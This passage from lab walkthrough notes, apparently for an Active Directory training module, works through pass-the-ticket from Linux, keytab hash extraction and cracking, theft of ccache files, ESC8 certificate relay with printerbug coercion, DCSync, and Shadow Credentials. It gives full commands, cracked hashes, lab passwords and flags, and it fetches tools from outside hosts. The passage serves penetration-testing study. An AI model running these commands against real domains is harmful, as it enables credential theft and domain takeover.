+```
+
+Set up Chisel:
+
+```bash
+wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
+gzip -d chisel_1.7.7_linux_amd64.gz
+mv chisel_* chisel && chmod +x ./chisel
+sudo ./chisel server --reverse
+```
+
+Connect to Ms01 and run the client:
+
+```bash
+xfreerdp /v:10.129.204.23 /u:david /d:inlanefreight.htb /p:Password2 /dynamic-resolution
+
+c:\tools\chisel.exe client 10.10.14.33:8080 R:socks
+```
+
+Transfer Julio's ccache and set the variable:
+
+```bash
+export KRB5CCNAME=/home/htb-student/krb5cc_647401106_I8I133
+```
+
+Impacket (use target machine name, `-k`, and `-no-pass` if prompted):
+
+```bash
+proxychains impacket-wmiexec dc01 -k
+```
+
+Evil-WinRM (install `krb5-user`, realm `INLANEFREIGHT.HTB`, KDC `DC01`):
+
+```bash
+sudo apt-get install krb5-user -y
+```
+
+If already installed, edit `/etc/krb5.conf`:
+
+```bash
+cat /etc/krb5.conf
+# [libdefaults] default_realm = INLANEFREIGHT.HTB
+# [realms] INLANEFREIGHT.HTB = { kdc = dc01.inlanefreight.htb }
+```
+
+```bash
+proxychains evil-winrm -i dc01 -r inlanefreight.htb
+```
+
+
+
+## Miscellaneous
+
+Convert between ccache (Linux) and kirbi (Windows) formats:
+
+```bash
+impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi
+```
+
+Import a kirbi on Windows with Rubeus:
+
+```bash
+C:\tools\Rubeus.exe ptt /ticket:c:\tools\julio.kirbi
+klist
+dir \\dc01\julio
+```
+
+
+
+## Linikatz
+
+A Cisco tool bringing Mimikatz-style credential extrction to UNIX. Requires root. Extracts credentials/tickets from FreeIPA, SSSD, Samba, Vintella, etc., dumping them (in ccache and keytab formats) into a `linikatz.*` folder for reuse.
+
+```bash
+wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
+/opt/linikatz.sh
+```
+
+
+
+## Key takeaways
+
+The workflow is find tickets (keytab/ccache) -> impersonate via `kinit` or `KRB5CCNAME` -> extract/crack hashes for lateral movement -> escalate to root to steal others' ccache -> pivot to Domain Admin. The recurring pattern is that root access unlocks every ccache in `/tmp`, and keytabs are your route to crackable hashes.
+
+## Connect to HTB
+
+
+
+#### Connect to the target machine using SSH to the port TCP/2222 and the provided credentials. Read the flag in David's home directory.
+
+```bash
+ssh david@inlanefreight.htb@10.129.204.23 -p 2222
+cat flag.txt
+Gett1ng_Acc3$$_to_LINUX01
+```
+
+
+
+#### Which group can connect to LINUX01?
+
+```bash
+realm list
+
+inlanefreight.htb
+  type: kerberos
+  realm-name: INLANEFREIGHT.HTB
+  domain-name: inlanefreight.htb
+  configured: kerberos-member
+  server-software: active-directory
+  client-software: sssd
+  required-package: sssd-tools
+  required-package: sssd
+  required-package: libnss-sss
+  required-package: libpam-sss
+  required-package: adcli
+  required-package: samba-common-bin
+  login-formats: %U@inlanefreight.htb
+  login-policy: allow-permitted-logins
+  permitted-logins: david@inlanefreight.htb, julio@inlanefreight.htb
+  permitted-groups: Linux Admins
+
+Linux Admins
+```
+
+
+
+#### Look for a keytab file that you have read and write access. Submit the file name as a response.
+
+```bash
+find / -name *keytab* -ls 2>/dev/null
+
+   287437      4 -rw-r--r--   1 root     root         2110 Aug  9  2021 /usr/lib/python3/dist-packages/samba/tests/dckeytab.py
+   288276      4 -rw-r--r--   1 root     root         1871 Oct  4  2022 /usr/lib/python3/dist-packages/samba/tests/__pycache__/dckeytab.cpython-38.pyc
+   287720     24 -rw-r--r--   1 root     root        22768 Jul 18  2022 /usr/lib/x86_64-linux-gnu/samba/ldb/update_keytab.so
+   286812     28 -rw-r--r--   1 root     root        26856 Jul 18  2022 /usr/lib/x86_64-linux-gnu/samba/libnet-keytab.so.0
+   131610      4 -rw-------   1 root     root         2694 Jul 23 13:39 /etc/krb5.keytab
+   262464     12 -rw-r--r--   1 root     root        10015 Oct  4  2022 /opt/impacket/impacket/krb5/keytab.py
+   262184      4 -rw-rw-rw-   1 root     root          216 Jul 23 14:05 /opt/specialfiles/carlos.keytab
+   131201      8 -rw-r--r--   1 root     root         4582 Oct  6  2022 /opt/keytabextract.py
+   287958      4 drwx------   2 sssd     sssd         4096 Jun 21  2022 /var/lib/sss/keytabs
+   398204      4 -rw-r--r--   1 root     root          380 Oct  4  2022 /var/lib/gems/2.7.0/doc/gssapi-1.3.1/ri/GSSAPI/Simple/set_keytab-i.ri
+
+# The only file that has `-rw-rw-rw-` /opt/specialfiles/carlos.keytab
+klist -k -t /opt/specialfiles/carlos.keytab
+
+Keytab name: FILE:/opt/specialfiles/carlos.keytab
+KVNO Timestamp           Principal
+---- ------------------- ------------------------------------------------------
+   1 07/23/2026 14:10:01 carlos@INLANEFREIGHT.HTB
+   1 07/23/2026 14:10:01 carlos@INLANEFREIGHT.HTB
+   1 07/23/2026 14:10:01 carlos@INLANEFREIGHT.HTB
+
+klist
+kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
+klist
+
+smbclient //dc01/carlos -k -c ls
+
+python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab 
+
+[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
+[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
+[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
+[+] Keytab File successfully imported.
+	REALM : INLANEFREIGHT.HTB
+	SERVICE PRINCIPAL : carlos/
+	NTLM HASH : a738f92b3c08b424ec2d99589a9cce60
+	AES-256 HASH : 42ff0baa586963d9010584eb9590595e8cd47c489e25e82aae69b1de2943007f
+	AES-128 HASH : fa74d5abf4061baa1d4ff8485d1261c4
+
+a738f92b3c08b424ec2d99589a9cce60 -> NTLM
+
+hashcat -m 1000 ntlm.txt /usr/share/wordlists/rockyou.txt
+
+a738f92b3c08b424ec2d99589a9cce60:Password5                
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 1000 (NTLM)
+Hash.Target......: a738f92b3c08b424ec2d99589a9cce60
+Time.Started.....: Thu Jul 23 10:28:45 2026 (0 secs)
+Time.Estimated...: Thu Jul 23 10:28:45 2026 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:  7946.5 kH/s (0.20ms) @ Accel:1024 Loops:1 Thr:1 Vec:16
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 147456/14344384 (1.03%)
+Rejected.........: 0/147456 (0.00%)
+Restore.Point....: 139264/14344384 (0.97%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#1....: katie89 -> mckinley1
+Hardware.Mon.#1..: Temp: 46c Util: 13%
+
+Started: Thu Jul 23 10:28:44 2026
+Stopped: Thu Jul 23 10:28:47 2026
+
+su - carlos@inlanefreight.htb
+> Password5
+
+cat flag.txt
+C@rl0s_1$_H3r3
+```
+
+
+
+#### Check Carlos' crontab, and look for keytabs to which Carlos has access. Try to get the credentials of the user svc_workstations and use them to authenticate via SSH. Submit the flag.txt in svc_workstations' home directory.
+
+```bash
+# Check Carlos' crontab for the keytab reference
+crontab -l
+
+# Edit this file to introduce tasks to be run by cron.
+# 
+# Each task to run has to be defined through a single line
+# indicating with different fields when the task will be run
+# and what command to run for the task
+# 
+# To define the time you can provide concrete values for
+# minute (m), hour (h), day of month (dom), month (mon),
+# and day of week (dow) or use '*' in these fields (for 'any').
+# 
+# Notice that tasks will be started based on the cron's system
+# daemon's notion of time and timezones.
+# 
+# Output of the crontab jobs (including errors) is sent through
+# email to the user the crontab file belongs to (unless redirected).
+# 
+# For example, you can run a backup of all your user accounts
+# at 5 a.m every week with:
+# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/
+# 
+# For more information see the manual pages of crontab(5) and cron(8)
+# 
+# m h  dom mon dow   command
+*/5 * * * * /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh
+
+cat /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh
+#!/bin/bash
+
+kinit svc_workstations@INLANEFREIGHT.HTB -k -t /home/carlos@inlanefreight.htb/.scripts/svc_workstations.kt
+smbclient //dc01.inlanefreight.htb/svc_workstations -c 'ls'  -k -no-pass > /home/carlos@inlanefreight.htb/script-test-results.txt
+
+python3 /opt/keytabextract.py /home/carlos@inlanefreight.htb/.scripts/svc_workstations.kt
+[!] No RC4-HMAC located. Unable to extract NTLM hashes.
+[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
+[!] Unable to identify any AES128-CTS-HMAC-SHA1 hashes.
+[+] Keytab File successfully imported.
+	REALM : INLANEFREIGHT.HTB
+	SERVICE PRINCIPAL : svc_workstations/
+	AES-256 HASH : 0c91040d4d05092a3d545bbf76237b3794c456ac42c8d577753d64283889da6d
+
+find / -name '*.kt*' -ls 2>/dev/null
+   262184      4 -rw-------   1 carlos@inlanefreight.htb domain users@inlanefreight.htb      246 Jul 23 14:50 /home/carlos@inlanefreight.htb/.scripts/svc_workstations._all.kt
+   262163      4 -rw-------   1 carlos@inlanefreight.htb domain users@inlanefreight.htb       94 Jul 23 14:50 /home/carlos@inlanefreight.htb/.scripts/svc_workstations.kt
+
+ 
+# Attacker
+python3 -m pyftpdlib --port 2121 --write
+
+# Server
+curl -o keytabextract.py ftp://10.10.17.216:2121/keytabextract.py
+
+python3 keytabextract.py /home/carlos@inlanefreight.htb/.scripts/svc_workstations._all.kt
+[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
+[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
+[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
+[+] Keytab File successfully imported.
+	REALM : INLANEFREIGHT.HTB
+	SERVICE PRINCIPAL : svc_workstations/
+	NTLM HASH : 7247e8d4387e76996ff3f18a34316fdd
+	AES-256 HASH : 0c91040d4d05092a3d545bbf76237b3794c456ac42c8d577753d64283889da6d
+	AES-128 HASH : 3a7e52143531408f39101187acc80677
+
+hashcat -a 0 -m 1000 7247e8d4387e76996ff3f18a34316fdd /usr/share/wordlists/rockyou.txt
+
+7247e8d4387e76996ff3f18a34316fdd:Password4                
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 1000 (NTLM)
+Hash.Target......: 7247e8d4387e76996ff3f18a34316fdd
+Time.Started.....: Thu Jul 23 11:14:13 2026 (0 secs)
+Time.Estimated...: Thu Jul 23 11:14:13 2026 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........: 10125.4 kH/s (0.16ms) @ Accel:1024 Loops:1 Thr:1 Vec:16
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 196608/14344384 (1.37%)
+Rejected.........: 0/196608 (0.00%)
+Restore.Point....: 188416/14344384 (1.31%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#1....: becky101 -> piggy!
+Hardware.Mon.#1..: Temp: 65c Util: 14%
+
+Started: Thu Jul 23 11:14:13 2026
+Stopped: Thu Jul 23 11:14:15 2026
+
+ssh svc_workstations@inlanefreight.htb@10.129.204.23 -p 2222
+> Password4
+
+ls
+cat flag.txt
+Mor3_4cce$$_m0r3_Pr1v$
+
+sudo -l
+[sudo] password for svc_workstations@inlanefreight.htb: 
+Matching Defaults entries for svc_workstations@inlanefreight.htb on linux01:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User svc_workstations@inlanefreight.htb may run the following commands on linux01:
+    (ALL) ALL
+
+sudo su
+
+cd /root
+cat flag.txt 
+Ro0t_Pwn_K3yT4b
+
+root@linux01:/tmp# ls -lah
+total 76K
+drwxrwxrwt 13 root                               root                           4.0K Jul 23 15:35 .
+drwxr-xr-x 20 root                               root                           4.0K Oct  6  2021 ..
+drwxrwxrwt  2 root                               root                           4.0K Jul 23 13:37 .font-unix
+drwxrwxrwt  2 root                               root                           4.0K Jul 23 13:37 .ICE-unix
+-rw-------  1 julio@inlanefreight.htb            domain users@inlanefreight.htb 1.4K Jul 23 15:35 krb5cc_647401106_HRJDux
+-rw-------  1 julio@inlanefreight.htb            domain users@inlanefreight.htb 1.4K Jul 23 15:35 krb5cc_647401106_oPTGQV
+-rw-------  1 david@inlanefreight.htb            domain users@inlanefreight.htb 2.9K Jul 23 14:24 krb5cc_647401107_P7I2KK
+-rw-------  1 svc_workstations@inlanefreight.htb domain users@inlanefreight.htb 1.5K Jul 23 15:29 krb5cc_647401109_aDUUE9
+-rw-------  1 carlos@inlanefreight.htb           domain users@inlanefreight.htb 3.2K Jul 23 15:37 krb5cc_647402606
+-rw-------  1 carlos@inlanefreight.htb           domain users@inlanefreight.htb 1.8K Jul 23 14:45 krb5cc_647402606_JXLqlM
+drwx------  3 root                               root                           4.0K Jul 23 13:38 snap.lxd
+drwx------  3 root                               root                           4.0K Jul 23 13:37 systemd-private-84da123b6a8a4566a9b08c4ad0528bc0-ModemManager.service-ZAXgqi
+drwx------  3 root                               root                           4.0K Jul 23 13:38 systemd-private-84da123b6a8a4566a9b08c4ad0528bc0-systemd-logind.service-7mOKTf
+drwx------  3 root                               root                           4.0K Jul 23 13:37 systemd-private-84da123b6a8a4566a9b08c4ad0528bc0-systemd-resolved.service-X9Wz4g
+drwx------  3 root                               root                           4.0K Jul 23 13:37 systemd-private-84da123b6a8a4566a9b08c4ad0528bc0-systemd-timesyncd.service-Sc8TSi
+drwxrwxrwt  2 root                               root                           4.0K Jul 23 13:37 .Test-unix
+drwx------  2 root                               root                           4.0K Jul 23 13:37 vmware-root_695-4021718990
+drwxrwxrwt  2 root                               root                           4.0K Jul 23 13:37 .X11-unix
+drwxrwxrwt  2 root                               root                           4.0K Jul 23 13:37 .XIM-unix
+root@linux01:/tmp# cp /tmp/krb5cc_647401106_oPTGQV /root/julio.ccache
+root@linux01:/tmp# export KRB5CCNAME=/root/julio.ccache
+root@linux01:/tmp# klist
+Ticket cache: FILE:/root/julio.ccache
+Default principal: julio@INLANEFREIGHT.HTB
+
+
+cp /tmp/krb5cc_647401106_HRJDux /root/julio.ccache
+export KRB5CCNAME=/root/julio.ccache
+klist
+
+Ticket cache: FILE:/root/julio.ccache
+Default principal: julio@INLANEFREIGHT.HTB
+
+Valid starting       Expires              Service principal
+10/07/2022 11:32:01  10/07/2022 21:32:01  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
+	renew until 10/08/2022 11:32:01
+
+cp /tmp/krb5cc_647401106_oPTGQV /root/julio.ccache
+export KRB5CCNAME=/root/julio.ccache
+klist
+
+smbclient //DC01/julio -N
+ls
+get julio.txt
+exit
+
+cat julio.txt
+JuL1()_SH@re_fl@g
+```
+
+
+
+#### Use the LINUX01$ Kerberos ticket to read the flag found in DC01\linux01. Submit the contents as your response (the flag starts with Us1nG_).
+
+```bash
+wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
+```
+
+```bash
+curl -o linikatz.sh ftp://10.10.17.216:2121/linikatz.sh
+```
+
+```bash
+chmod 777 linikatz.sh
+./linikatz.sh
+
+Valid starting       Expires              Service principal
+07/23/2026 15:55:01  07/24/2026 01:55:01  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
+	renew until 07/24/2026 15:55:01
+07/23/2026 15:55:01  07/24/2026 01:55:01  ldap/dc01.inlanefreight.htb@
+	renew until 07/24/2026 15:55:01
+07/23/2026 15:55:01  07/24/2026 01:55:01  ldap/dc01.inlanefreight.htb@INLANEFREIGHT.HTB
+	renew until 07/24/2026 15:55:01
+
+I: [freeipa-check] FreeIPA AD configuration
+-rw-r--r-- 1 root root 959 Mar  4  2020 /etc/pki/fwupd/GPG-KEY-Linux-Vendor-Firmware-Service
+-rw-r--r-- 1 root root 2169 Mar  4  2020 /etc/pki/fwupd/GPG-KEY-Linux-Foundation-Firmware
+-rw-r--r-- 1 root root 1702 Mar  4  2020 /etc/pki/fwupd/GPG-KEY-Hughski-Limited
+-rw-r--r-- 1 root root 1679 Mar  4  2020 /etc/pki/fwupd/LVFS-CA.pem
+-rw-r--r-- 1 root root 2169 Mar  4  2020 /etc/pki/fwupd-metadata/GPG-KEY-Linux-Foundation-Metadata
+-rw-r--r-- 1 root root 959 Mar  4  2020 /etc/pki/fwupd-metadata/GPG-KEY-Linux-Vendor-Firmware-Service
+-rw-r--r-- 1 root root 1679 Mar  4  2020 /etc/pki/fwupd-metadata/LVFS-CA.pem
+I: [sss-check] SSS AD configuration
+-rw------- 1 root root 1609728 Jul 23 15:55 /var/lib/sss/db/timestamps_inlanefreight.htb.ldb
+-rw------- 1 root root 1286144 Jul 23 13:37 /var/lib/sss/db/config.ldb
+-rw------- 1 root root 4154 Jul 23 15:55 /var/lib/sss/db/ccache_INLANEFREIGHT.HTB
+-rw------- 1 root root 1609728 Jul 23 15:55 /var/lib/sss/db/cache_inlanefreight.htb.ldb
+-rw------- 1 root root 1286144 Oct  4  2022 /var/lib/sss/db/sssd.ldb
+-rw-rw-r-- 1 root root 10406312 Jul 23 15:50 /var/lib/sss/mc/initgroups
+-rw-rw-r-- 1 root root 6406312 Jul 23 15:55 /var/lib/sss/mc/group
+-rw-rw-r-- 1 root root 8406312 Jul 23 15:55 /var/lib/sss/mc/passwd
+-rw-r--r-- 1 root root 113 Jul 23 13:37 /var/lib/sss/pubconf/krb5.include.d/localauth_plugin
+-rw-r--r-- 1 root root 40 Jul 23 13:37 /var/lib/sss/pubconf/krb5.include.d/krb5_libdefaults
+-rw-r--r-- 1 root root 15 Jul 23 13:37 /var/lib/sss/pubconf/krb5.include.d/domain_realm_inlanefreight_htb
+-rw-r--r-- 1 root root 12 Jul 23 15:55 /var/lib/sss/pubconf/kdcinfo.INLANEFREIGHT.HTB
+-rw------- 1 root root 504 Oct  6  2022 /etc/sssd/sssd.conf
+I: [vas-check] VAS AD configuration
+I: [pbis-check] PBIS AD configuration
+I: [samba-check] Samba configuration
+-rw-r--r-- 1 root root 8942 Oct  4  2022 /etc/samba/smb.conf
+-rw-r--r-- 1 root root 8 Jul 18  2022 /etc/samba/gdbcommands
+I: [kerberos-check] Kerberos configuration
+-rw-r--r-- 1 root root 2800 Jul 23 13:37 /etc/krb5.conf
+-rw------- 1 root root 2694 Jul 23 13:39 /etc/krb5.keytab
+-rw------- 1 julio@inlanefreight.htb domain users@inlanefreight.htb 1406 Jul 23 15:55 /tmp/krb5cc_647401106_HRJDux
+-rw------- 1 julio@inlanefreight.htb domain users@inlanefreight.htb 1414 Jul 23 15:55 /tmp/krb5cc_647401106_KUx29v
+-rw------- 1 david@inlanefreight.htb domain users@inlanefreight.htb 2935 Jul 23 14:24 /tmp/krb5cc_647401107_P7I2KK
+-rw------- 1 svc_workstations@inlanefreight.htb domain users@inlanefreight.htb 1535 Jul 23 15:29 /tmp/krb5cc_647401109_aDUUE9
+-rw------- 1 carlos@inlanefreight.htb domain users@inlanefreight.htb 3175 Jul 23 15:57 /tmp/krb5cc_647402606
+-rw------- 1 carlos@inlanefreight.htb domain users@inlanefreight.htb 1746 Jul 23 14:45 /tmp/krb5cc_647402606_JXLqlM
+I: [samba-check] Samba machine secrets
+I: [samba-check] Samba hashes
+I: [check] Cached hashes
+I: [sss-check] SSS hashes
+./linikatz.sh: line 358: tdbdump: command not found
+I: [check] Machine Kerberos tickets
+I: [sss-check] SSS ticket list
+Ticket cache: FILE:/var/lib/sss/db/ccache_INLANEFREIGHT.HTB
+Default principal: LINUX01$@INLANEFREIGHT.HTB
+
+FILE:/var/lib/sss/db/ccache_INLANEFREIGHT.HTB
+
+export KRB5CCNAME=/var/lib/sss/db/ccache_INLANEFREIGHT.HTB
+klist
+
+smbclient //DC01/linux01 -N
+ls
+get flag.txt
+exit
+
+cat flag.txt
+```
+
+
+
+#### Transfer Julio's ccache file from LINUX01 to your attack host. Follow the example to use chisel and proxychains to connect via evil-winrm from your attack host to MS01 and DC01. Mark DONE when finished.
+
+
+
+#### From Windows (MS01), export Julio's ticket using Mimikatz or Rubeus. Convert the ticket to ccache and use it from Linux to connect to the C disk. Mark DONE when finished.
+
+
+
+# Pass the Certificate
+
+PKINIT (Public Key Cryptography for Initial Authentication) is a Kerberos extension enabling public key cryptography during initial auth, typically for smart card logons. Pass-the-Certificate is the technique of using X.509 certificates to obtain TGTs, mainly used alongside AD CS attacks and Shadow Credentials.
+
+## AD CS NTLM Relay Attack (ESC8)
+
+ESC8 is an NTLM relay attack targeting an ADCS HTTP web enrollment endpoint (default `/CertSrv`). A CA allowing web enrollment hosts the app at `/CertSrv`.
+
+Relay inbound connections to the web enrollment service:
+
+```bash
+impacket-ntlmrelayx -t http://10.129.234.110/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
+```
+
+The `--template` value varies per environment (it's the cert template DCs use for authentication); enumerate it with certipy.
+
+Coerce a machine account to authenticate against your host using the printer bug (requires Print Spooler running on target). Forces DC01 to authenticate to the attacker:
+
+```bash
+python3 printerbug.py INLANEFREIGHT.LOCAL/wwhite:"package5shores_topher1"@10.129.234.109 10.10.16.12
+```
+
+ntlmrelayx relays the auth, issues a certificate for `DC01$` and writes it to `./DC01$.pfx`. 
+
+Now perform Pass-the-Certificate to get a TGT as DC01$ using gettgtpkinit.py. Clone and set up:
+
+```bash
+git clone https://github.com/dirkjanm/PKINITtools.git && cd PKINITtools
+python3 -m venv .venv
+source .venv/bin/activate
+pip3 install -r requirements.txt
+```
+
+If you hit "Error detecting the version of libcrypto", fix with:
+
+```bash
+pip3 install -I git+https://github.com/wbond/oscrypto.git
+```
+
+Request the TGT:
+
+```bash
+python3 gettgtpkinit.py -cert-pfx ../krbrelayx/DC01\$.pfx -dc-ip 10.129.234.109 'inlanefreight.local/dc01$' /tmp/dc.ccache
+```
+
+With the TGT, you're back in Pass-the-Ticket territory. As the DC machine account, run DCSync to dump the Administrator hash:
+
+```bash
+export KRB5CCNAME=/tmp/dc.ccache
+impacket-secretsdump -k -no-pass -dc-ip 10.129.234.109 -just-dc-user Administrator 'INLANEFREIGHT.LOCAL/DC01$'@DC01.INLANEFREIGHT.LOCAL
+```
+
+
+
+## Shadow Credentials (msDS-KeyCredentialLink)
+
+Abuses the `msDS-KeyCredentialLink` attribute, which stores public keys usable for PKINIT auth. In BloodHound, the AddKeyCredentialLink edge means one user can write to another's `msDS-KeyCredentialLink` and take control.
+
+Use pywhisker to generate an X.509 cert and write the public key to the victim's attribute:
+
+```bash
+pywhisker --dc-ip 10.129.234.109 -d INLANEFREIGHT.LOCAL -u wwhite -p 'package5shores_topher1' --target jpinkman --action add
+```
+
+This outputs a PFX file and its password. Use them with gettgtpkinit.py to get a TGT as the victim:
+
+```bash
+python3 gettgtpkinit.py -cert-pfx ../eFUVVTPf.pfx -pfx-pass 'bmRH4LK7UwPrAOfvIx6W' -dc-ip 10.129.234.109 INLANEFREIGHT.LOCAL/jpinkman /tmp/jpinkman.ccache
+```
+
+Pass the ticket and verify:
+
+```bash
+export KRB5CCNAME=/tmp/jpinkman.ccache
+klist
+```
+
+If the victim is in Remote Management Users, connect via WinRM with Kerberos (ensure `krb5.conf` is configured):
+
+```bash
+evil-winrm -i dc01.inlanefreight.local -r inlanefreight.local
+```
+
+
+
+## NO PKINIT?
+
+If you can obtain a cert but can't use it for pre-auth (KDC doesn't support the appropriate EKU), use PassTheCert to authenticate against LDAPS with the certificate and perform attacks like changing passwords or granting DCSync rights. Out of scope for this module. 
+
+## Onwards
+
+Next focus: password management. Practice these lateral movement techniques until they're second nature -- a broad toolset is critical during assessments.
+
+## Connect to HTB
+
+> Authenticate to with user "wwhite" and password "package5shores_topher1"
+
+```bash
+# In the 1st terminal
+source venv/bin/activate
+cd impacket
+pip install --upgrade pip setuptools wheel
+python3 setup.py install
+
+# In the 2nd terminal
+source venv/bin/activate
+cd impacket
+wget https://github.com/fortra/impacket/raw/refs/heads/master/examples/ntlmrelayx.py
+
+sudo $(which ntlmrelayx.py) -t http://10.129.234.172/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
+
+# In the 3rd terminal
+source venv/bin/activate
+wget https://github.com/dirkjanm/krbrelayx/raw/refs/heads/master/printerbug.py
+
+python3 printerbug.py INLANEFREIGHT.LOCAL/wwhite:'package5shores_topher1'@10.129.234.172 10.10.17.216
+
+```
+
+```bash
+cd ~
+git clone https://github.com/dirkjanm/PKINITtools.git
+source ~/impacket/venv/bin/activate
+pip install -r PKINITtools/requirements.txt
+
+python3 PKINITtools/gettgtpkinit.py -cert-pfx ~/impacket/DC01.pfx -dc-ip 10.129.234.174 'inlanefreight.local/dc01$' /tmp/dc.ccache
+
+pip3 install -I git+https://github.com/wbond/oscrypto.git
+python3 PKINITtools/gettgtpkinit.py -cert-pfx ~/impacket/DC01.pfx -dc-ip 10.129.234.174 'inlanefreight.local/dc01$' /tmp/dc.ccache
+2026-07-26 19:44:24,763 minikerberos INFO     Loading certificate and key from file
+2026-07-26 19:44:25,229 minikerberos INFO     Requesting TGT
+2026-07-26 19:44:36,966 minikerberos INFO     AS-REP encryption key (you might need this later):
+2026-07-26 19:44:36,966 minikerberos INFO     0c3eb020c5d7f17a98da8882509cdd47181b549ca14600de45673ff0c565ce46
+2026-07-26 19:44:36,982 minikerberos INFO     Saved TGT to file
+
+export KRB5CCNAME=/tmp/dc.ccache
+secretsdump.py -k -no-pass -dc-ip 10.129.234.174 -just-dc-user Administrator 'INLANEFREIGHT.LOCAL/DC01$'@DC01.INLANEFREIGHT.LOCAL
+Impacket v0.14.0.dev0+20260528.131215.b27827ae - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:fd02e525dd676fd8ca04e200d265f20c:::
+[*] Kerberos keys grabbed
+Administrator:aes256-cts-hmac-sha1-96:ec2223ff4c0bce238aa04d30be0fe9e634495f9449c0c25307c66d7c12d8f93a
+Administrator:aes128-cts-hmac-sha1-96:ffb8855b50dd1bf538c8001620c4f1d1
+Administrator:des-cbc-md5:a1f262b50b64c46b
+[*] Cleaning up... 
+
+cd evil-winrm-py
+evil-winrm -u Administrator -i 10.129.234.174 -H fd02e525dd676fd8ca04e200d265f20c
+```
+
+
+
+#### What are the contents of flag.txt on jpinkman's desktop?
+
+```bash
+git clone https://github.com/ShutdownRepo/pywhisker
+source venv/bin/activate
+pip3 install -r pywhisker/requirements.txt
+cd pywhisker
+python3 setup.py install
+
+python3 pywhisker.py --dc-ip 10.129.234.174 -d INLANEFREIGHT.LOCAL -u wwhite -p 'package5shores_topher1' --target jpinkman --action add
+
+[*] Searching for the target account
+[*] Target user found: CN=Jesse Pinkman,CN=Users,DC=inlanefreight,DC=local
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating KeyCredential
+[*] KeyCredential generated with DeviceID: e4d239f3-643a-978b-549d-49ea6feecc9e
+[*] Updating the msDS-KeyCredentialLink attribute of jpinkman
+[+] Updated the msDS-KeyCredentialLink attribute of the target object
+[*] Converting PEM -> PFX with cryptography: EF9QFWz5.pfx
+[+] PFX exportiert nach: EF9QFWz5.pfx
+[i] Passwort für PFX: e4uDmK4d7lokho7Uu7tg
+[+] Saved PFX (#PKCS12) certificate & key at path: EF9QFWz5.pfx
+[*] Must be used with password: e4uDmK4d7lokho7Uu7tg
+[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
+
+python3 ~/PKINITtools/gettgtpkinit.py -cert-pfx ./EF9QFWz5.pfx -pfx-pass 'e4uDmK4d7lokho7Uu7tg' -dc-ip 10.129.234.174 INLANEFREIGHT.LOCAL/jpinkman /tmp/jpinkman.ccache
+
+export KRB5CCNAME=/tmp/jpinkman.ccache
+klist
+Ticket cache: FILE:/tmp/jpinkman.ccache
+Default principal: jpinkman@INLANEFREIGHT.LOCAL
+
+Valid starting       Expires              Service principal
+07/26/2026 20:09:57  07/27/2026 06:09:57  krbtgt/INLANEFREIGHT.LOCAL@INLANEFREIGHT.LOCAL
+
+sudo nano /etc/krb5.conf
+
+[libdefaults]
+    default_realm = INLANEFREIGHT.LOCAL
+[realms]
+    INLANEFREIGHT.LOCAL = {
+        kdc = 10.129.234.174
+        default_domain = inlanefreight.local
+    }
+[domain_realm]
+    .inlanefreight.local = INLANEFREIGHT.LOCAL
+    inlanefreight.local = INLANEFREIGHT.LOCAL
+
+cd evil-winrm-py
+evil-winrm -i dc01.inlanefreight.local -r inlanefreight.local
+cd ..
+cd Desktop 
+more flag.txt
+3d7e3dfb56b200ef715cfc300f07f3f8
+```
+
+
+
+# Password Policies
+
+After learning how to capture credentials, the focus shifts to protecting them. Just as traffic laws keep driving safe, password policies keep users from acting without security constraints. Two components matter: the definition of the policy (the rules for password creation) and its enforcement (the technology that ensures compliance). Both are essential.
+
+The running example: Mark, a non-IT employee, tries to set his password to password123, gets rejected for not meeting the policy, and is shown the minimum requirements.
+
+## Password policy
+
+A password policy is a set of rules that encourages users to create strong passwords and use them appropriately per the organization's standards. Its scope covers the entire password lifecycle — creation, storage, management, and transmission — not just minimum requirements.
+
+## Password policy standards
+
